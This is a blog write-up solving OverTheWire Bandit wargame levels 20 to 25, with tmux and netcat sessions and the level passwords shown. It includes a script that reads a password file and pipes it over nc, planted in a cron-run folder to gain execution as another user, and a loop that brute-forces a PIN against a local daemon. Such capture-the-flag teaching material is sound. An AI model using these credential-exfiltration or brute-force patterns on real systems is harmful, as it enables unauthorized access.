---
author: "Justin Perdok"
categories:
  [
    "Bandit",
    "grep",
    "ctf",
    "netcat",
    "Write-Up",
    "wargames",
    "OverTheWire",
    "tmux",
  ]
date: 2019-09-12T13:06:05Z
description: ""
draft: false
slug: "write-up-overthewire-bandit-level-20-level-24"
summary: "We ❤️ tmux."
tags:
  [
    "Bandit",
    "grep",
    "ctf",
    "netcat",
    "Write-Up",
    "wargames",
    "OverTheWire",
    "tmux",
  ]
title: "Write-up: OverTheWire - Bandit Level 20 → Level 25"
---

### Bandit Level 20 → Level 21

**Level Goal:**
*There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Try connecting to your own network daemon to see if it works as you think*

To solve this we need to run 2 programs. The `suconnect` binary and some sort of program that can open a port and receive data, `nc` is perfect for this. But how do we run 2 programs at the same time ? There are multiple ways to go here with `bg` \ `fg`, `screens` or even a second `ssh` session, but I personally love `tmux` . If you want to learn `tmux` I recommend looking at this [cheat sheet](https://gist.github.com/MohamedAlaa/2961058).

To start we login and start `tmux` . I create an additional horizontal pane with `CTRL+B` followed by `SHIFT+"` .

```
~/wargames/overthewire/bandit$ ssh bandit20@bandit.labs.overthewire.org -p 2220

bandit20@bandit~$ tmux
*CTRL+B SHIFT "*
```

On the bottom pane I start `nc` as a listener with the `-l` flag on port `1337` with the `-p` flag. Then on top pane i run suconnect and tell it to connect to port `1337`. We then paste in the password on the `nc` listener and the `suconnect` library returns the next password.

```

bandit20@bandit:~$ ./suconnect 1337
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$

──────────────────────────────────────────────────

bandit20@bandit:~$ nc -l -p 1337
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$


^d
^d
[exited]
bandit20@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
```

### Bandit Level 21 → Level 22

**Level Goal:**
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
*

Ah our friendly neighbor `cron`. Lets start with `cat`'ing all the jobs. Here we find one find 3 jobs. Lets test if we can `cat` the first one.

```
~/wargames/overthewire/bandit$ ssh bandit21@bandit.labs.overthewire.org -p 2220

bandit21@bandit~$ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
```

So it seems the job creates a file in a random file in `/tmp`. It then uses `cat` on `/etc/bandit_pass/bandit22` and redirects the output to that random file. So lets `cat` that file for the password.

```
bandit21@bandit~$ cat /usr/bin/cronjob_bandit22
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit21@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
```

### Bandit Level 22 → Level 23

**Level Goal:**
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
*

So again, lets start with `cat`. A educated guess would to be to check `/usr/bin/cronjob_bandit23.sh`.

```
~/wargames/overthewire/bandit$ ssh bandit22@bandit.labs.overthewire.org -p 2220

bandit22@bandit~$ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;> /dev/null
```

Here we find a bash script. So lets see what it does.

This bash scripts creates a variable named `myname` and `mytarget`.

`myname` contains the output of `whoami` which returns the current username.

`mytarget` contains the output on 3 piped commands, `echo` , `md5sum` and `cut`. `echo` returns the string `echo I am user bandit23` , `md5sum` then prints the `MD5 checksum` of that string and pipes it to `cut` which removes everything after the checksum.

After setting these variables it then proceeds to copy over the password file of bandit23 to a file stored in `/tmp/` with the `MD5 checksum` as it filename.

```
bandit22@bandit~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

So lets replicate this by hand.

```
bandit22@bandit~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit~$ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
```

And then `cat` the password file.

```
bandit22@bandit~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n<font>
bandit22@bandit~$ logout
Connection to bandit.labs.overthewire.org closed.
```

### Bandit Level 23 → Level 24

**Level Goal:**
*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
*

So I'm not going to bother to check the current cronjobs and just `cat` the cronjob for bandit24. This contains another bash script. Lets see what it does.

It sets up a variable named `myname` that contains the name of the current user running it, i.e. bandit24. It then changes directory's to `/var/spool/bandit24` . It then proceeds to run every file in this folder and then deleting it. Great! We got ACE! So lets abuse this.

```
~/wargames/overthewire/bandit$ ssh bandit23@bandit.labs.overthewire.org -p 2220

bandit23@bandit~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
```

Lets first setup a folder in `/tmp` where we can work in. Create `give_pass.sh` , setup execution rights and open it in vim.

```
bandit23@bandit~$ mkdir /tmp/giv_pass
bandit23@bandit~$ cd /tmp/giv_pass
bandit23@bandit/tmp/giv_pass$ touch give_pass.sh
bandit23@bandit/tmp/giv_pass$ chmod +x give_pass.sh
bandit23@bandit/tmp/giv_pass$ vim give_pass.sh
```

Lets keep this really simple and just `cat` the password file and redirect this to `nc` which will connect to localhost on port `1337`.

```
#/bin/bash
cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 1337
```

Now lets start `tmux` and create 2 panes.

```
bandit23@bandit/tmp/giv_pass$ tmux
CTRL + B SHIFT "
```

In the bottom pane I start a `nc` listener on port `1337`. I then copy over the `give_pass.sh` script to the ACE folder. After about 1 min we are greeted with the password of bandit24.

```
bandit23@bandit/tmp/giv_pass$ cp give_pass.sh /var/spool/bandit24/give_pass.sh
bandit23@bandit/tmp/giv_pass$
────────────────────────────────────
bandit23@bandit/tmp/giv_pass$ nc -l -p 1337
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
^d
^d
[exited]
bandit23@bandit/tmp/giv_pass$ logout
Connection to bandit.labs.overthewire.org closed.
```

### Bandit Level 24 → Level 25

**Level Goal:**
*A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
*

Okay, so we need to create a pretty basic brute forcing tool. We need to loop over every possible 4-digit pincode ( `0000` and `9999` ). Lets setup a folder in /tmp, create brute_port.sh, setup execution rights and open it in vim.

```
bandit23@bandit~$ ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
bandit24@bandit~$ mkdir /tmp/brute_port
bandit24@bandit~$ cd /tmp/brute_port
bandit24@bandit/tmp/brute_port$ touch brute_port.sh
bandit24@bandit/tmp/brute_port$ chmod +x brute_port.sh
bandit24@bandit/tmp/brute_port$ vim brute_port.sh
```

Lets not make this harder then it should be and create a `for` loop. The `for` loop will iterate over each possible 4-digit pincode and store there current pincode in the variable `i`. Then we `echo` the password of bandit24 plus the current iteration of the pincode.

```
#/bin/bash
for i in {0000..9999}
do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i
done
```

Now we start the script and pipe `|` the output to `nc` which will connect to `localhost:30002` . Running the script like this will return the `Wrong! Please enter the correct pincode. Try again.` string 9999 times, so lets hide that with `grep`.

```
bandit24@bandit:/tmp/brute_port$ ./brute_port.sh | nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
```

Using the `-v` flag on `grep` we can do a `invert-match` . This means `grep` will only match to values that are not equal to the wrong pincode message. So lets rerun our script.

```
bandit24@bandit:/tmp/brute_port$ ./brute_port.sh | nc 127.0.0.1 30002 | grep -v 'Wrong! Please enter the correct pincode. Try again.'
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit/tmp/brute_port$ logout
Connection to bandit.labs.overthewire.org closed.
```
